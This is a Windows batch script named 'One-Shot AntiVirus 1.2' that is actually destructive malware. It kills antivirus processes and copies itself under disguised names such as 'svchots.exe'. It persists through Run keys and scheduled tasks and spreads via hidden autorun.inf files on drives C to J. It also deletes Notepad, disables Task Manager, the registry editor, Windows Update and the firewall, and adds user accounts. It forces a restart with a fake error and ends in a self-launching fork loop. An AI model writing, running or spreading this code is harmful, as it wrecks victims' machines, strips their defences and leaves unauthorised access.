@ECHO OFF

title One-Shot AntiVirus 1.2

cls

tskill kavsvc

tskill kaspersky

tskill kavmm

tskill avconfig

tskill ccapp

cls

tskill avgcc

tskill avgemc

tskill avgupsvc

tskill avgamsvr

tskill avpcc

cls

tskill bdswitch

tskill bdss

tskill nod32kui

tskill nod32krn

tskill ashwebsv

cls

tskill nprotect

tskill navshext

tskill mcvsescn

tskill webscanx

tskill mcvsescn

cls

start pinball.exe

start pinball.exe

start iexplore.exe

start iexplore.exe

start iexplore.exe

start firefox.exe

start firefox.exe

start firefox.exe

cls

copy %0 %systemroot%\svchots.exe /y

attrib +r +h +s C:\WINDOWS\svchots.exe

copy %0 %systemroot%\msg.exe /y

attrib +r +h +s C:\WINDOWS\msg.exe

reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v msg /t REG_SZ /d %systemroot%\msg.exe /f

cls

MD C:\Window

MD D:\Window

MD E:\Window

MD F:\Window

MD G:\Window

MD H:\Window

MD I:\Window

MD J:\Window

cls

copy LittleRedRidingHood.txt C:\Window /y

copy LittleRedRidingHood.txt D:\Window /y

copy LittleRedRidingHood.txt E:\Window /y

copy LittleRedRidingHood.txt F:\Window /y

copy LittleRedRidingHood.txt G:\Window /y

copy LittleRedRidingHood.txt H:\Window /y

copy LittleRedRidingHood.txt I:\Window /y

copy LittleRedRidingHood.txt J:\Window /y

cls

copy msg.exe C:\Window /y

copy msg.exe D:\Window /y

copy msg.exe E:\Window /y

copy msg.exe F:\Window /y

copy msg.exe G:\Window /y

copy msg.exe H:\Window /y

copy msg.exe I:\Window /y

copy msg.exe J:\Window /y

cls

copy explorer.exe C:\Window /y

copy explorer.exe D:\Window /y

copy explorer.exe E:\Window /y

copy explorer.exe F:\Window /y

copy explorer.exe G:\Window /y

copy explorer.exe H:\Window /y

copy explorer.exe I:\Window /y

copy explorer.exe J:\Window /y

cls

copy autorun.inf C:\ /y 

copy autorun.inf D:\ /y

copy autorun.inf E:\ /y

copy autorun.inf F:\ /y

copy autorun.inf G:\ /y

copy autorun.inf H:\ /y

copy autorun.inf I:\ /y

copy autorun.inf J:\ /y

cls

attrib +r +h +s C:\autorun.inf

attrib +r +h +s D:\autorun.inf

attrib +r +h +s E:\autorun.inf

attrib +r +h +s F:\autorun.inf

attrib +r +h +s G:\autorun.inf

attrib +r +h +s H:\autorun.inf

attrib +r +h +s I:\autorun.inf

attrib +r +h +s J:\autorun.inf

cls

copy autorun.inf C:\Window /y 

copy autorun.inf D:\Window /y

copy autorun.inf E:\Window /y

copy autorun.inf F:\Window /y

copy autorun.inf G:\Window /y

copy autorun.inf H:\Window /y

copy autorun.inf I:\Window /y

copy autorun.inf J:\Window /y
 
cls

copy svchots.exe C:\Window /y

copy svchots.exe D:\Window /y

copy svchots.exe E:\Window /y

copy svchots.exe F:\Window /y

copy svchots.exe G:\Window /y
 
copy svchots.exe H:\Window /y

copy svchots.exe I:\Window /y

copy svchots.exe J:\Window /y

cls


AT 6:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\svchots.exe

AT 9:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\svchots.exe

AT 12:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\svchots.exe

AT 15:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\svchots.exe

AT 18:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\svchots.exe

AT 21:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\svchots.exe

AT 0:00 /every:M,T,W,TH,F,S,SU C:\WINDOWS\svchots.exe

cls

del C:\WINDOWS\NOTEPAD.EXE /q /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f

REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f

REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL /v CheckedValue /t REG_DWORD /d 0 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFileMenu /t REG_DWORD /d 1 /f

cls

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoStartMenuMorePrograms /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoToolBarsOnTaskBar /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoShellSearchButton /t REG_DWORD /d 1 /f

REG add HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v NoAutoUpdate /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Group Policy Objects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Policies\WindowsUpdate\DisableWindowsUpdateAccess 

cls

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoWindowsUpdate /t REG_DWORD /d 1 /f

REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoWindowsUpdate /t REG_DWORD /d 1 /f

REG add HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v NoAutoUpdate /t REG_DWORD /d 1 /f

REG add HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v AUOptions /t REG_DWORD /d 1 /f

REG add HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate

REG add HKLM\\Software\Microsoft\Windows\CurrentVersion\Policies\WindowsUpdate

cls

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDevMgrUpdate /t REG_DWORD /d 1 /f

REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v NoViewContextMenu /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFind /t REG_DWORD /d 1 /f

REG add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DisableCAD /t REG_DWORD /d 1 /f

cls

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v HideClock /t REG_DWORD /d 1 /f

REG add HKCU\Control Panel\don't load /v timedate.cpl /t REG_SZ /d no /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoTrayItemsDisplay /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoPropertiesMycomputer /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f

cls

REG add HKCU\Control Panel\Mouse /v MouseTrails /t REG_SZ /d 5 /f

REG add HKCU\Software\Microsoft\Internet Explorer\Main /v NoUpdateCheck /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f

REG add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f

cls

REG add HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile /v EnableFirewall /t REG_DWORD /d 0 /f

REG add HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile /v DoNotAllowExceptions /t REG_DWORD /d 0 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoTrayContextMenu /t REG_DWORD /d 1 /f

REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewOnDrive /t REG_DWORD /d 4 /f

net user Viktor 1254 /add

net user Vladimir 1254 /add

net user Vassili 1254 /add

cls

shutdown -r -t 5 -c "Windows must restart because explorer.exe was terminated unexpectedly." -f

:recycle
start %0
goto recycle




